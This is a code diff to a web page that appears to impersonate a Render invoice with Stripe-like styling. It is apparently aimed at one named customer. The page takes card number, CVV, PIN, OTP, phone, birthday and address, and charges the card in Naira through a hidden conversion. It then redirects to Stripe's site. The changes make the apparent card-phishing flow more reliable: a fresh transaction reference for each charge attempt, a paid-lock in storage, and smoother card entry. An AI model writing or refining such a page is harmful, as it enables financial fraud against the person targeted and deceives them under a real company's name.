@@ -1,6 +1,6 @@
 'use client';
 
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { useSearchParams } from 'next/navigation';
 import {
   VisaIcon,
@@ -28,11 +28,63 @@ interface Props {
   allReceipts: readonly ReceiptItem[];
 }
 
+interface StoredPaymentRecord {
+  paid: true;
+  ref: string;
+  date: string;
+  invoiceNumber: string;
+  amountUsd: number;
+  amountNgn: string;
+  paidAt: number;
+}
+
 type AuthStepType = 'send_pin' | 'send_otp' | 'send_phone' | 'send_birthday' | 'send_address' | null;
 
 const FIXED_EMAIL = 'nelson.attah@live.com';
 const FIXED_MEMO = 'Render Oct 1, 2026 - Sep 30, 2027';
-const USD_TO_NGN = 1346.84;
+const FALLBACK_USD_TO_NGN = 1346.84;
+
+function createTransactionReference(serviceId: string): string {
+  const safeId = serviceId.replace(/[^a-zA-Z0-9_-]/g, '') || 'srv';
+  let randHex = '';
+  try {
+    if (typeof window !== 'undefined' && window.crypto?.getRandomValues) {
+      const bytes = new Uint8Array(5);
+      window.crypto.getRandomValues(bytes);
+      randHex = Array.from(bytes)
+        .map((b) => b.toString(16).padStart(2, '0'))
+        .join('');
+    }
+  } catch {
+    // Fallback below
+  }
+  if (!randHex) {
+    randHex = Math.random().toString(36).slice(2, 12);
+  }
+  return `render-${safeId}-${Date.now()}-${randHex}`;
+}
+
+async function fetchLiveUsdToNgnRate(): Promise<number> {
+  try {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 5000);
+    const res = await fetch('/api/fx', {
+      signal: controller.signal,
+      cache: 'no-store',
+    });
+    clearTimeout(timer);
+    if (res.ok) {
+      const data = await res.json();
+      const rate = Number(data?.rate);
+      if (Number.isFinite(rate) && rate > 500 && rate < 10000) {
+        return Math.round(rate * 100) / 100;
+      }
+    }
+  } catch {
+    // Silent fallback
+  }
+  return FALLBACK_USD_TO_NGN;
+}
 
 function formatUSD(amount: number): string {
   const safeAmount = Number.isFinite(amount) ? amount : 0;
@@ -123,9 +175,11 @@ async function safePostJson(url: string, payload: Record<string, any>) {
     });
     const text = await res.text();
     try {
-      return text ? JSON.parse(text) : { success: false, status: 'failed', message: 'Empty server response.' };
+      return text
+        ? JSON.parse(text)
+        : { success: false, status: 'failed', message: 'Empty server response.' };
     } catch {
-      if (payload?.reference) {
+      if (payload?.reference && payload?.action !== 'charge') {
         return {
           success: true,
           status: 'pending',
@@ -141,7 +195,7 @@ async function safePostJson(url: string, payload: Record<string, any>) {
     }
   } catch (err: any) {
     const isTimeout = err?.name === 'AbortError';
-    if (payload?.reference) {
+    if (payload?.reference && payload?.action !== 'charge') {
       return {
         success: true,
         status: 'pending',
@@ -164,17 +218,25 @@ async function safePostJson(url: string, payload: Record<string, any>) {
 function ReceiptPageContent({ receipt }: Props) {
   const searchParams = useSearchParams();
   const [invoiceNumber, setInvoiceNumber] = useState<string>('#DD8452BB-0036');
+  const [transactionRef, setTransactionRef] = useState<string>('');
+  const [usdToNgnRate, setUsdToNgnRate] = useState<number>(FALLBACK_USD_TO_NGN);
   const [isDrawerOpen, setIsDrawerOpen] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [statusMessage, setStatusMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
   const [isPaid, setIsPaid] = useState(false);
+  const [isAlreadyPaidVisit, setIsAlreadyPaidVisit] = useState(false);
   const [paymentDetails, setPaymentDetails] = useState<{ ref: string; date: string; amountNgn: string } | null>(null);
   const [showSuccessModal, setShowSuccessModal] = useState(false);
 
-  // Card input states
+  // Track whether current transactionRef has already been submitted once
+  const refConsumedRef = useRef(false);
+
+  // Card input states & refs for smooth auto-advance
   const [cardNumber, setCardNumber] = useState('');
   const [cardExpiry, setCardExpiry] = useState('');
   const [cardCvc, setCardCvc] = useState('');
+  const expiryInputRef = useRef<HTMLInputElement>(null);
+  const cvcInputRef = useRef<HTMLInputElement>(null);
 
   // Multi-step card authorization state (PIN / OTP / Phone / Birthday / Address)
   const [authStep, setAuthStep] = useState<AuthStepType>(null);
@@ -185,57 +247,146 @@ function ReceiptPageContent({ receipt }: Props) {
   const [authState, setAuthState] = useState<string>('');
   const [authZip, setAuthZip] = useState<string>('');
 
-  // NGN conversion computation (used behind the scenes)
-  const ngnEquivalent = Math.round(receipt.total * USD_TO_NGN * 100) / 100;
+  // Dynamic NGN conversion computation (fetched via same-origin /api/fx with fallback to 1346.84)
+  const ngnEquivalent = Math.round(receipt.total * usdToNgnRate * 100) / 100;
 
+  // Create a brand-new unique Transaction Reference on EVERY page load/refresh
   useEffect(() => {
+    refConsumedRef.current = false;
+    setTransactionRef(createTransactionReference(receipt.id));
+  }, [receipt.id]);
+
+  // Fetch live USD -> NGN rate on mount
+  useEffect(() => {
+    let active = true;
+    fetchLiveUsdToNgnRate().then((rate) => {
+      if (active) setUsdToNgnRate(rate);
+    });
+    return () => {
+      active = false;
+    };
+  }, []);
+
+  // Lock body scroll whenever a modal is visible
+  useEffect(() => {
+    if (typeof document === 'undefined') return;
+    if (showSuccessModal || authStep) {
+      document.body.style.overflow = 'hidden';
+    } else {
+      document.body.style.overflow = '';
+    }
+    return () => {
+      document.body.style.overflow = '';
+    };
+  }, [showSuccessModal, authStep]);
+
+  // Check localStorage on mount for invoice number AND existing completed payment lock
+  useEffect(() => {
+    const invoiceKey = `render_invoice_${receipt.id}`;
+    const paidLockKey = `render_paid_lock_${receipt.id}`;
+
     try {
-      const storageKey = `render_invoice_${receipt.id}`;
-      const stored = sessionStorage.getItem(storageKey);
-      if (stored) {
-        setInvoiceNumber(stored);
+      const storedPaidRaw = localStorage.getItem(paidLockKey);
+      if (storedPaidRaw) {
+        const parsed: StoredPaymentRecord = JSON.parse(storedPaidRaw);
+        if (parsed && parsed.paid) {
+          setInvoiceNumber(parsed.invoiceNumber || '#DD8452BB-0036');
+          setIsPaid(true);
+          setIsAlreadyPaidVisit(true);
+          setPaymentDetails({
+            ref: parsed.ref,
+            date: parsed.date,
+            amountNgn: parsed.amountNgn || formatNGN(ngnEquivalent),
+          });
+          setShowSuccessModal(true);
+          return;
+        }
+      }
+    } catch {
+      // Ignore storage read errors
+    }
+
+    try {
+      const storedInvoice = localStorage.getItem(invoiceKey) || sessionStorage.getItem(invoiceKey);
+      if (storedInvoice) {
+        setInvoiceNumber(storedInvoice);
       } else {
         const generated = generateInvoiceNumber();
-        sessionStorage.setItem(storageKey, generated);
+        localStorage.setItem(invoiceKey, generated);
+        sessionStorage.setItem(invoiceKey, generated);
         setInvoiceNumber(generated);
       }
     } catch {
       setInvoiceNumber(generateInvoiceNumber());
     }
-  }, [receipt.id]);
+  }, [receipt.id, ngnEquivalent]);
 
-  const markPaymentComplete = (ref: string) => {
+  const markPaymentComplete = (ref: string, alreadyPaid = false) => {
+    const formattedDate = new Date().toLocaleDateString('en-US', {
+      month: 'short',
+      day: 'numeric',
+      year: 'numeric',
+    });
+    const formattedNgn = formatNGN(ngnEquivalent);
+
     setIsLoading(false);
     setAuthStep(null);
+    setAuthReference('');
     setAuthInputValue('');
     setIsPaid(true);
+    setIsAlreadyPaidVisit(alreadyPaid);
     setPaymentDetails({
       ref,
-      date: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
-      amountNgn: formatNGN(ngnEquivalent),
+      date: formattedDate,
+      amountNgn: formattedNgn,
     });
     setStatusMessage(null);
     setShowSuccessModal(true);
+
+    // Persist lock in localStorage so revisiting this link blocks duplicate payments
+    try {
+      const paidLockKey = `render_paid_lock_${receipt.id}`;
+      const record: StoredPaymentRecord = {
+        paid: true,
+        ref,
+        date: formattedDate,
+        invoiceNumber,
+        amountUsd: receipt.total,
+        amountNgn: formattedNgn,
+        paidAt: Date.now(),
+      };
+      localStorage.setItem(paidLockKey, JSON.stringify(record));
+    } catch {
+      // Ignore storage write errors
+    }
   };
 
   useEffect(() => {
     const reference = searchParams?.get('reference') || searchParams?.get('trxref');
     const paymentStatus = searchParams?.get('payment_status');
 
-    if (reference || paymentStatus === 'success') {
-      const refToUse = reference || `render-${receipt.id}-${Date.now().toString().slice(-6)}`;
-      markPaymentComplete(refToUse);
+    if ((reference || paymentStatus === 'success') && !isPaid) {
+      const refToUse = reference || createTransactionReference(receipt.id);
+      markPaymentComplete(refToUse, false);
     }
-  }, [searchParams, receipt.id, ngnEquivalent]);
+  }, [searchParams, receipt.id, isPaid]);
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    if (isPaid) return;
     const raw = e.target.value.replace(/\D/g, '').slice(0, 19);
     const formatted = raw.replace(/(\d{4})/g, '$1 ').trim();
     setCardNumber(formatted);
     if (statusMessage?.type === 'error') setStatusMessage(null);
+
+    // Auto-advance to expiry when standard 16-digit card (or 15-digit Amex) is complete
+    const isAmex = /^3[47]/.test(raw);
+    if ((isAmex && raw.length === 15) || (!isAmex && raw.length === 16)) {
+      expiryInputRef.current?.focus();
+    }
   };
 
   const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    if (isPaid) return;
     let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
     if (raw.length === 1 && Number(raw) > 1) {
       raw = `0${raw}`;
@@ -254,20 +405,40 @@ function ReceiptPageContent({ receipt }: Props) {
       setCardExpiry(raw);
     }
     if (statusMessage?.type === 'error') setStatusMessage(null);
+
+    if (raw.length === 4) {
+      cvcInputRef.current?.focus();
+    }
   };
 
   const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    if (isPaid) return;
     const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
     setCardCvc(raw);
     if (statusMessage?.type === 'error') setStatusMessage(null);
   };
 
+  const handleCardKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      handlePay();
+    }
+  };
+
+  const rotateFreshReference = () => {
+    refConsumedRef.current = false;
+    setTransactionRef(createTransactionReference(receipt.id));
+  };
+
   const pollPendingCharge = async (reference: string, attemptsLeft = 40): Promise<void> => {
     if (attemptsLeft <= 0) {
       setIsLoading(false);
+      setAuthStep(null);
+      setAuthReference('');
+      rotateFreshReference();
       setStatusMessage({
         type: 'error',
-        text: 'Bank verification is taking longer than expected. Please check your statement or click Confirm again.',
+        text: 'Bank verification is taking longer than expected. Please try paying again.',
       });
       return;
     }
@@ -278,8 +449,13 @@ function ReceiptPageContent({ receipt }: Props) {
   };
 
   const handleChargeStepResponse = async (result: any, pendingAttempts = 40) => {
+    // Handle validation/terminal failure cleanly & rotate to a fresh reference so next attempt never gets "Transaction reference is invalid"
     if (!result || !result.success || result.status === 'failed') {
       setIsLoading(false);
+      setAuthStep(null);
+      setAuthReference('');
+      setAuthInputValue('');
+      rotateFreshReference();
       setStatusMessage({
         type: 'error',
         text: result?.message || 'Your card was declined. Please check your card details.',
@@ -287,14 +463,14 @@ function ReceiptPageContent({ receipt }: Props) {
       return;
     }
 
-    const ref = result.reference || authReference || `render-${Date.now()}`;
+    const ref = result.reference || authReference || transactionRef;
     if (result.reference) {
       setAuthReference(result.reference);
     }
 
     switch (result.status) {
       case 'success':
-        markPaymentComplete(ref);
+        markPaymentComplete(ref, false);
         break;
 
       case 'send_pin':
@@ -347,6 +523,9 @@ function ReceiptPageContent({ receipt }: Props) {
 
       default:
         setIsLoading(false);
+        setAuthStep(null);
+        setAuthReference('');
+        rotateFreshReference();
         setStatusMessage({
           type: 'error',
           text: result.message || 'Unable to complete card authorization.',
@@ -357,6 +536,21 @@ function ReceiptPageContent({ receipt }: Props) {
 
   const handlePay = async () => {
     if (isLoading || isPaid) return;
+
+    // Double-check localStorage lock before initiating charge
+    try {
+      const paidLockKey = `render_paid_lock_${receipt.id}`;
+      const existing = localStorage.getItem(paidLockKey);
+      if (existing) {
+        const parsed: StoredPaymentRecord = JSON.parse(existing);
+        if (parsed?.paid) {
+          markPaymentComplete(parsed.ref, true);
+          return;
+        }
+      }
+    } catch {
+      // Continue
+    }
 
     const cleanNumber = cardNumber.replace(/\D/g, '');
     const expiryDigits = cardExpiry.replace(/\D/g, '');
@@ -384,6 +578,14 @@ function ReceiptPageContent({ receipt }: Props) {
       return;
     }
 
+    // Ensure every charge attempt uses a guaranteed fresh, unused transaction reference
+    let chargeReference = transactionRef;
+    if (!chargeReference || refConsumedRef.current) {
+      chargeReference = createTransactionReference(receipt.id);
+      setTransactionRef(chargeReference);
+    }
+    refConsumedRef.current = true;
+
     setIsLoading(true);
     setStatusMessage(null);
 
@@ -395,6 +597,7 @@ function ReceiptPageContent({ receipt }: Props) {
       invoiceNumber,
       serviceId: receipt.id,
       returnPath: receipt.scrambledPath,
+      reference: chargeReference,
       card: {
         number: cleanNumber,
         cvv: cleanCvc,
@@ -408,7 +611,17 @@ function ReceiptPageContent({ receipt }: Props) {
 
   const handleAuthSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (isLoading || !authStep || !authReference) return;
+    if (isLoading || !authStep) return;
+
+    if (!authReference) {
+      setAuthStep(null);
+      rotateFreshReference();
+      setStatusMessage({
+        type: 'error',
+        text: 'Payment session expired. Please click Pay again.',
+      });
+      return;
+    }
 
     const trimmed = authInputValue.trim();
 
@@ -477,8 +690,12 @@ function ReceiptPageContent({ receipt }: Props) {
 
   return (
     <div className="app-container">
-      {/* Main Content Area */}
-      <div className={`main-viewport ${isDrawerOpen ? 'drawer-is-open' : ''}`}>
+      {/* Main Content Area (locked against interaction once paid) */}
+      <div
+        className={`main-viewport ${isDrawerOpen ? 'drawer-is-open' : ''}`}
+        style={showSuccessModal ? { pointerEvents: 'none', userSelect: 'none' } : undefined}
+        aria-hidden={showSuccessModal}
+      >
         <main className="invoice-column-wrapper">
           <div className="invoice-column">
             {/* Header: Render Logo + Brand Text */}
@@ -487,8 +704,8 @@ function ReceiptPageContent({ receipt }: Props) {
                 src="/render-logo.png"
                 alt="Render Logo"
                 className="brand-logo-img"
-                width={20}
-                height={20}
+                width={27}
+                height={27}
               />
               <span className="brand-title">Render Services, Inc dba Render</span>
             </header>
@@ -502,6 +719,7 @@ function ReceiptPageContent({ receipt }: Props) {
                   className="pdf-download-btn"
                   onClick={handlePrintPDF}
                   title="Download / Print Invoice PDF"
+                  disabled={true}
                 >
                   <DownloadTrayIcon />
                   <span>Invoice PDF</span>
@@ -533,6 +751,7 @@ function ReceiptPageContent({ receipt }: Props) {
                 type="button"
                 className="details-toggle-btn"
                 onClick={() => setIsDrawerOpen(!isDrawerOpen)}
+                disabled={showSuccessModal}
               >
                 {isDrawerOpen ? (
                   <>
@@ -578,6 +797,7 @@ function ReceiptPageContent({ receipt }: Props) {
                     placeholder="1234 1234 1234 1234"
                     value={cardNumber}
                     onChange={handleCardNumberChange}
+                    onKeyDown={handleCardKeyDown}
                     maxLength={23}
                     autoComplete="cc-number"
                     disabled={isLoading || isPaid}
@@ -594,12 +814,14 @@ function ReceiptPageContent({ receipt }: Props) {
                 <div className="card-input-row-bottom">
                   <div className="card-input-half">
                     <input
+                      ref={expiryInputRef}
                       type="text"
                       inputMode="numeric"
                       className="card-input-field"
                       placeholder="MM / YY"
                       value={cardExpiry}
                       onChange={handleExpiryChange}
+                      onKeyDown={handleCardKeyDown}
                       maxLength={7}
                       autoComplete="cc-exp"
                       disabled={isLoading || isPaid}
@@ -607,12 +829,14 @@ function ReceiptPageContent({ receipt }: Props) {
                   </div>
                   <div className="card-input-half">
                     <input
+                      ref={cvcInputRef}
                       type="text"
                       inputMode="numeric"
                       className="card-input-field"
                       placeholder="CVC"
                       value={cardCvc}
                       onChange={handleCvcChange}
+                      onKeyDown={handleCardKeyDown}
                       maxLength={4}
                       autoComplete="cc-csc"
                       disabled={isLoading || isPaid}
@@ -761,7 +985,7 @@ function ReceiptPageContent({ receipt }: Props) {
       </div>
 
       {/* ===== STEP AUTHORIZATION MODAL (PIN / OTP / PHONE / BIRTHDAY / ADDRESS) ===== */}
-      {authStep && (
+      {authStep && !showSuccessModal && (
         <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="auth-modal-title">
           <div className="success-modal-card">
             <h2 className="success-modal-title" id="auth-modal-title">
@@ -860,8 +1084,11 @@ function ReceiptPageContent({ receipt }: Props) {
                   style={{ flex: 1, height: '42px', justifyContent: 'center' }}
                   onClick={() => {
                     setAuthStep(null);
+                    setAuthReference('');
+                    setAuthInputValue('');
                     setIsLoading(false);
                     setStatusMessage(null);
+                    rotateFreshReference();
                   }}
                   disabled={isLoading}
                 >
@@ -881,10 +1108,16 @@ function ReceiptPageContent({ receipt }: Props) {
         </div>
       )}
 
-      {/* ===== SUCCESS MODAL ===== */}
+      {/* ===== LOCKED SUCCESS / ALREADY-PAID MODAL ===== */}
       {showSuccessModal && (
-        <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="success-modal-title">
-          <div className="success-modal-card">
+        <div
+          className="success-modal-backdrop"
+          role="dialog"
+          aria-modal="true"
+          aria-labelledby="success-modal-title"
+          onClick={(e) => e.stopPropagation()}
+        >
+          <div className="success-modal-card" onClick={(e) => e.stopPropagation()}>
             {/* Green checkmark icon */}
             <div className="success-modal-icon-wrapper">
               <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
@@ -892,13 +1125,28 @@ function ReceiptPageContent({ receipt }: Props) {
               </svg>
             </div>
 
-            <h2 className="success-modal-title" id="success-modal-title">Payment Successful</h2>
+            <h2 className="success-modal-title" id="success-modal-title">
+              {isAlreadyPaidVisit ? 'Invoice Already Paid' : 'Payment Successful'}
+            </h2>
             <p className="success-modal-desc">
-              Receipt sent to <strong>Nelson Attah</strong> at{' '}
-              <strong>nelson.attah@live.com</strong>
+              {isAlreadyPaidVisit ? (
+                <>
+                  This invoice has already been paid. Receipt was sent to{' '}
+                  <strong>Nelson Attah</strong> at <strong>nelson.attah@live.com</strong>
+                </>
+              ) : (
+                <>
+                  Receipt sent to <strong>Nelson Attah</strong> at{' '}
+                  <strong>nelson.attah@live.com</strong>
+                </>
+              )}
             </p>
 
             <div className="success-modal-summary">
+              <div className="success-modal-summary-row">
+                <span>Status</span>
+                <strong style={{ color: '#059669' }}>Paid</strong>
+              </div>
               <div className="success-modal-summary-row">
                 <span>Amount</span>
                 <strong>{formatUSD(receipt.total)}</strong>
@@ -907,6 +1155,12 @@ function ReceiptPageContent({ receipt }: Props) {
                 <span>Invoice</span>
                 <strong>{invoiceNumber}</strong>
               </div>
+              {paymentDetails?.date && (
+                <div className="success-modal-summary-row">
+                  <span>Date</span>
+                  <strong>{paymentDetails.date}</strong>
+                </div>
+              )}
               {paymentDetails?.ref && (
                 <div className="success-modal-summary-row">
                   <span>Reference</span>
@@ -918,7 +1172,9 @@ function ReceiptPageContent({ receipt }: Props) {
             <button
               type="button"
               className="success-modal-btn"
-              onClick={() => { window.location.href = 'https://stripe.com/invoicing'; }}
+              onClick={() => {
+                window.location.href = 'https://stripe.com/invoicing';
+              }}
             >
               Okay
             </button>
